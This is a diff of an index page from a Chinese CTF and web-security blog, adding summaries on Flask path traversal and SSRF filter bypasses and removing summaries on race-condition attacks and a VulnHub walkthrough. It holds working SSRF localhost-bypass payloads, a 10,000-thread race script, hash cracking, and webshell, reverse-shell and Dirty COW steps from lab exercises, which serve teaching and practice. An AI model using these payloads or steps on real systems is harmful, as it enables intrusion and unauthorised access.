@@ -110,6 +110,39 @@
         alt="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp"
         title="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp" /></a></div><h1 class="home-title">ThnPinkman's blog</h1><div class="home-subtitle"><div id="id-1" class="typeit"></div></div><div class="links"></div></div>
 <article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/ctf/python%E6%80%BB%E7%BB%93/">python总结</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Web漏洞基础</a>&nbsp;<a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">任意文件读取(目录穿越) 2022网鼎杯-web669 例题 直接读取文件、参数可控且过滤不全
+#以下为部分关键代码，其它部分已省略 #............. @app.route(&#39;/&lt;path:file&gt;&#39;, methods=[&#39;GET&#39;]) def download(file): if session.get(&#39;updir&#39;): basedir = session.get(&#39;updir&#39;) try: path = os.path.join(basedir, file).replace(&#39;../&#39;, &#39;&#39;) if os.path.isfile(path): return send_file(path) else: return response(&#34;Not Found.&#34;, 404) except: return response(&#34;Failed.&#34;, 500) #............. 由于对../的处理只是简单使用replace方法进行替换置空，因此使用双写../（&hellip;.//）即可进行绕过
+path = os.path.join(basedir, file).replace(&#39;../&#39;, &#39;&#39;) 然后接下来使用flask的send_file模块读取文件
+if os.path.isfile(path): return send_file(path) 实现了任意文件读取
+使用open打开文件但未close 配合任意文件读取/proc/self/fd
+2020网鼎杯白虎组Web-PicDown app.py源码如下
+from flask import Flask, Response from flask import render_template from flask import request import os import urllib app = Flask(__name__) SECRET_FILE = &#34;/tmp/secret.</div><div class="post-footer">
+        <a href="/posts/ctf/python%E6%80%BB%E7%BB%93/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/python/">Python</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BAssrf/">burpsuite靶场ssrf</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Web漏洞基础</a></span></div><div class="content">服务器端请求伪造 (SSRF) 针对本地服务器的基本 SSRF 在商品下查看货物库存情况时抓包
+有stockApi参数 ，来进行访问
+根据目的修改成http://localhost/admin 是顺利访问到该页面的 ，也可以访问delete?username=carlos来删除这个用户
+为什么服务器会默认信任来自本地地址的请求呢，大概有如下原因
+访问控制策略可能编写于前端，我们修改请求包的时候是已经通过了前端的，所以很容易就被绕过了 有的应用程序为了方便灾难恢复将服务器设置为任意用户都可访问，这就导致也会默认信任本地地址 针对另一个后端系统的基本 SSRF 有的后端系统用户是无法直接访问的，但是服务器可以成功向其发送请求，所以如果利用ssrf同样可以向这些本不对用户开放的后端系统发出恶意请求。
+同样的方式，不过需要对ip进行爆破
+同样操作即可
+SSRF 与基于黑名单的输入过滤器 最常见的黑名单哦，127.0.0.1和localhost等关键词有不少方法来绕
+127.0.0.1绕过-进制转换十进制 2130706433八进制 017700000001二进制 0b1111111000000000000000000000001 十六进制 0x7f000001http://localhost/ # localhost就是代指127.0.0.1http://0/ # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1http://[0:0:0:0:0:ffff:127.0.0.1]/ # 在liunx下可用，window测试了下不行http://[::]:80/ # 在liunx下可用，window测试了下不行http://127。0。0。1/ # 用中文句号绕过http://①②⑦.⓪.⓪.①http://127.1/http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1 admin用双重url编码即可
+基于白名单的输入过滤器的 SSRF 在@前加的内容都不会被解析成host的内容，而#或?后面的的内容也不会被解析到path中
+url=http://ctf.@127.0.0.1/flag.php?show 双 URL 编码#是%2523
+http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos SSRF 通过开放重定向漏洞绕过过滤器 以上的尝试是不行的
+另一个功能点，查看下一个商品 ，会重定向到下一个商品
+可以利用这里的path参数进行重定向到指定的页面
+带外检测的盲 SSRF 与sql盲注相同，ssrf盲打最佳利用方式就是通过带外技术接收响应结果。也是同样使用burp自带的简易带外平台collaborator。即使有一些HTTP流量会被拦截，也会因为不怎么拦截DNS流量而获取我们想要的结果。 有的情况还可以利用SSRF盲打对目标后端系统进行探测，比如探测目标网络中开放的主机及端口之类的，这些同样也可以通过带外通道接收到。
+题目中直接告诉我们Referer头存在SSRF盲打漏洞</div><div class="post-footer">
+        <a href="/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BAssrf/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/ssrf/">Ssrf</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BAxxe/">burpsuite靶场XXE</a>
     </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
 </span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Web漏洞基础</a></span></div><div class="content">参考以下文章学习
@@ -186,48 +219,6 @@ carlos pass1wiener peter carlos pass2wiener peter 准备如上的字典即可
 with open(&#39;小脚本\pass.txt&#39;) as f: c = f.readlines() targ = open(&#39;小脚本\pass2.txt&#39;,&#34;w&#34;) s = &#39;peter&#39; for i in range(100): targ.</div><div class="post-footer">
         <a href="/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BA%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/">Read More</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">条件竞争</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Web漏洞基础</a></span></div><div class="content">前言 之前一直没有专门找时间分析条件竞争是什么，也只是浅显的认为跟文件包含有些关系，还是主要通过ctfshow的文件包含来了解的。还是有必要捋一下条件竞争这个东西。
-什么是条件竞争 看大家写的专业点的术语大概是条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现 bug。尤其在当前我们的系统中大量对资源进行共享，如果处理不当的话，就会产生条件竞争漏洞。
-通俗一点的解释也有群友在讲条件竞争 好比有人问你两句话 第一句“你有没有男朋友” 如果你回答没有 他会说第二句“现在我是你男朋友了” 但是 加入100个男人一次一次的问 你只会有一个男朋友， 100个男人同时问 只要你能同时回答100个 你就有100个男朋友了
-假设程序同时处理存钱和取钱，当取钱&quot;速度&quot;大于存钱时，可能就会出现取钱后程序还未来得及将金额减少，程序又立马处理存钱，由此产生非预期的结果
-我觉得还挺好理解的。
-例题Hgame2023 Hgame2023 中出现一道条件竞争的题目，很好的利用了这个思路
-我有10元，但是flag需要10000000000元
-可以简单粗暴地使用条件竞争,直接重复买Flag10000次，就赌服务器检查不过来
-import requests import threading def req(): url = &#39;http://week-3.hgame.lwsec.cn:31111/api/v1/user/buyProduct?product=Flag&amp;number=1&#39; headers = { &#39;Cookie&#39;:&#39;SESSION=MTY3NTE4OTc0NHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBY0FCV0ZrYldsdXwQnP1C-gBhrFuG-GFI2yGPc3QsG0CSUEHeRahONCVOxw==; session=MTY3NTE5MzMxMHxEdi1CQkFFQ180SUFBUkFCRUFBQUtQLUNBQUVHYzNSeWFXNW5EQW9BQ0hWelpYSnVZVzFsQm5OMGNtbHVad3dJQUFZeE1qTTBOVFk9fKDfSi3Bd18TAleiQIVGKj5Tlcxs4toyGz3e-eLGoGRV&#39; } r = requests.get(url=url, headers=headers) for i in range(10000): threading.Thread(target=req).start() 10000次 竞争，成功竞争出去了一百多次
-例题 1.文件上传+条件竞争 一般是上传文件，绕过防护之后，小马又会被立马删除。但是由于文件存在过，我们可以利用python脚本不断访问shell，这样就形成了python脚本和web删除程序之间的竞争，一定的测试量后，可以竞争到资源，执行shell，从而得到flag。
-https://co0ontty.github.io/2019/04/12/batterupload.html这个文章的例题挺清晰的
-burpsuit的攻击模块多线程不断发包，以达到我们的预期效果。
-2.session文件包含+条件竞争 这是我想学习的重点了 ,是通过ctfshow的web82来进行了解 https://www.bilibili.com/video/BV1P64y1Q72q?p=5&vd_source=cf73ac8de9b7c0322b1bccf77de91c5d先了解一下基础的前置知识：
-在cookie中设置 PHPSESSION=aaa 则会生成一个临时文件 /tmp/sess_aaa ，所以我们可控文件名
-文件内容如何控制？用PHP_SESSION_UPLOAD_PRGRESS参数
-PHP_SESSION_UPLOAD_PRGRESS参数的值为123，则 /tmp/sess_aaa的内容为123，则文件内容可控制
-由此原理我们可以写进shell然后rce
-首先通过PHP_SESSION_UPLOAD_PRGRESS在/tmp/sess_xxxx中写入一个shell</div><div class="post-footer">
-        <a href="/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">条件竞争</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--ch4inrulz_v1.0.1/">VulnHub — CH4INRULZ_v1.0.1</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-19">2024-08-19</time></span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>内网渗透</a></span></div><div class="content">VulnHub — CH4INRULZ_v1.0.1 扫描ip和端口 nmap 192.168.164.0/24 可以用dirb 扫描.bak备份文件 dirb http://192.168.164.137/ -x .bak curl直接读文件
-curl http://192.168.164.137/index.html.bak &amp;lt;!-- 我将使用 frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0 作为 .htpasswd 文件来保护开发路径 --&amp;gt; 用join来解密 这是个用户名和密码
-frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0
-将串字符保存到1.txt 然后john工具爆破密码 john 1.txt john 1.txt --show 得到一组用户名和密码， frank frank!!!
-登录刚才的development目录 ，成功登录
-然后有提示 uploader目录需要安全审查 访问后可以上传图片
-传上图片马（构造的gif图片） 显示成功上传，但是不知道路径
-8011端口收集信息 能够上传图片马，但不知道路径，这时候选择回头看看8011端口 扫目录看到api目录 访问/api 正在开发的api接口， 猜测files_api.php 可以文件读取
-没有file参数发送给我 ，所以猜测这里可以传file参数,尝试了一下是post传参 那么post传file参数可以进行文件读取 刚才上传文件后在/development/uploader/upload.php有回显，尝试读取这个upload.php
-并没有读取出源码，而是执行了php文件 这里继续用filter伪协议进行读取 ，成功得到源码 FRANKuploads/ 得到上传文件存储路径
-nc 反弹shell nc 先监听webshell里设置的4444端口
-文件读取刚刚上传的webshell.gif ，成功让gif文件以PHP执行
-反弹shell 成功
-www-data权限 脏牛提权 内核版本&gt;2.4.22 。2016年之前 都可以脏牛提权 版本符合</div><div class="post-footer">
-        <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/vulnhub--ch4inrulz_v1.0.1/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
 </article><ul class="pagination"><li class="page-item ">
                     <span class="page-link">
                         <a href="/">1</a>
@@ -249,6 +240,10 @@ www-data权限 脏牛提权 内核版本&gt;2.4.22 。2016年之前 都可以�
                 </li><li class="page-item ">
                     <span class="page-link">
                         <a href="/page/8/">8</a>
+                    </span>
+                </li><li class="page-item ">
+                    <span class="page-link">
+                        <a href="/page/9/">9</a>
                     </span>
                 </li></ul></div></div>
             </main><footer class="footer">
